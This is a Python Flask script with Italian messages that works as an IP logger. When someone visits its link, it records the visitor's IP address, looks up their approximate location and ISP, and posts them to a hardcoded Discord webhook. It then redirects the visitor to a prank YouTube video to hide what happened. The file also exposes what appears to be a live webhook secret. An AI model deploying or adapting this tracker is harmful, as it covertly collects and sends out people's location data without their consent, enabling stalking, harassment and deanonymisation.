from flask import Flask, request, redirect
from datetime import datetime
import requests
import os

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1528013241819594853/ajTR7-zJ32yBsxulXb4688xXeWaqVgr9pQk6dW3ffPpFaeWgbWydLkRQyH6M56515lNA"

def get_ip_info(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=country,regionName,city,isp", timeout=10)
        if response.status_code == 200:
            data = response.json()
            if data.get("status") == "success":
                return {
                    "country": data.get("country", "N/D"),
                    "region": data.get("regionName", "N/D"),
                    "city": data.get("city", "N/D"),
                    "isp": data.get("isp", "N/D")
                }
    except:
        pass
    return None

@app.route("/")
def index():
    forwarded = request.headers.get('X-Forwarded-For', '')
    if forwarded:
        ip = forwarded.split(',')[0].strip()
    else:
        ip = request.remote_addr
    
    date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")
    ip_info = get_ip_info(ip)
    
    description = f"**📅 Data:** {date}\n"
    if ip_info:
        description += f"**🌍 Paese:** {ip_info.get('country', 'N/D')}\n"
        description += f"**📍 Regione:** {ip_info.get('region', 'N/D')}\n"
        description += f"**🏙️ Città:** {ip_info.get('city', 'N/D')}\n"
        description += f"**🔌 ISP:** {ip_info.get('isp', 'N/D')}"
    else:
        description += "**⚠️ Geolocalizzazione non disponibile**"
    
    data = {
        "content": "🔔 **Nuovo IP loggato!**",
        "embeds": [{
            "title": f"IP: {ip}",
            "description": description,
            "color": 5814783,
            "timestamp": date
        }]
    }
    
    try:
        requests.post(WEBHOOK_URL, json=data, timeout=10)
        print(f"✅ Inviato: {ip}")
    except Exception as e:
        print(f"❌ Errore: {e}")
    
    return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
